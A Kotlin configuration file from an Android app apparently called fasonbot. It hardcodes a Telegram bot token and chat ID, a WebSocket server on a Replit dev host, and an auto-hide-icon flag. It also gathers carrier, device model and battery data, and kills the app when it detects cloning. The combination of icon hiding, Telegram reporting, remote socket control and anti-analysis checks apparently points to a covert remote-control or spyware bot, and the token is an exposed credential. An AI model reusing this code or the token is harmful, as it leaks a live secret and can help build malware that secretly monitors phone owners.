package com.fasonbot.app.config

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import java.util.*

object BotConfig {

    private const val BOT_TOKEN = "5803799424:AAHD7kzwjVQZStaEwM9DMNnehwUoxndM9BY"
    private const val CHAT_ID = "5803799424"
    private const val AUTO_HIDE_ICON = false

    // WebSocket server URL (current Replit dev URL)
    private const val SERVER_URL = "wss://f6ca1c07-54c2-4088-a140-f7e0830845aa-00-1nutal1h7mvuq.pike.replit.dev/ws"

    // Dashboard web URL (optional, for display/linking)
    private const val DASHBOARD_URL = "https://f6ca1c07-54c2-4088-a140-f7e0830845aa-00-1nutal1h7mvuq.pike.replit.dev"

    fun getBotToken(): String = BOT_TOKEN
    fun getChatId(): String = CHAT_ID
    fun shouldAutoHideIcon(): Boolean = AUTO_HIDE_ICON
    fun getServerUrl(): String = SERVER_URL
    fun getDashboardUrl(): String = DASHBOARD_URL

    fun getAndroidVersion(): Int = Build.VERSION.SDK_INT

    fun getAndroidVersionName(): String = when (Build.VERSION.SDK_INT) {
        28 -> "9.0 Pie"
        29 -> "10"
        30 -> "11"
        31 -> "12"
        32 -> "12L"
        33 -> "13"
        34 -> "14"
        35 -> "15"
        else -> "Android ${Build.VERSION.RELEASE}"
    }

    fun getProviderName(context: Context): String = try {
        val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        manager.networkOperatorName ?: "Unknown"
    } catch (_: Exception) { "Unknown" }

    fun getDeviceName(): String {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val locale = Locale.getDefault()
        return if (model.lowercase(locale).startsWith(manufacturer.lowercase(locale)))
            model.replaceFirstChar { it.uppercase() }
        else
            "${manufacturer.replaceFirstChar { it.uppercase() }} $model"
    }

    fun getBatteryPercentage(context: Context): Int = try {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    } catch (_: Exception) { 0 }

    fun isConfigValid(): Boolean = SERVER_URL.isNotEmpty() && SERVER_URL.startsWith("ws")

    fun checkAppCloning(activity: android.app.Activity) {
        try {
            val path = activity.filesDir.path
            if (path.contains("999") || path.count { it == '.' } > 2) {
                activity.finish()
                android.os.Process.killProcess(android.os.Process.myPid())
            }
        } catch (_: Exception) {}
    }
}
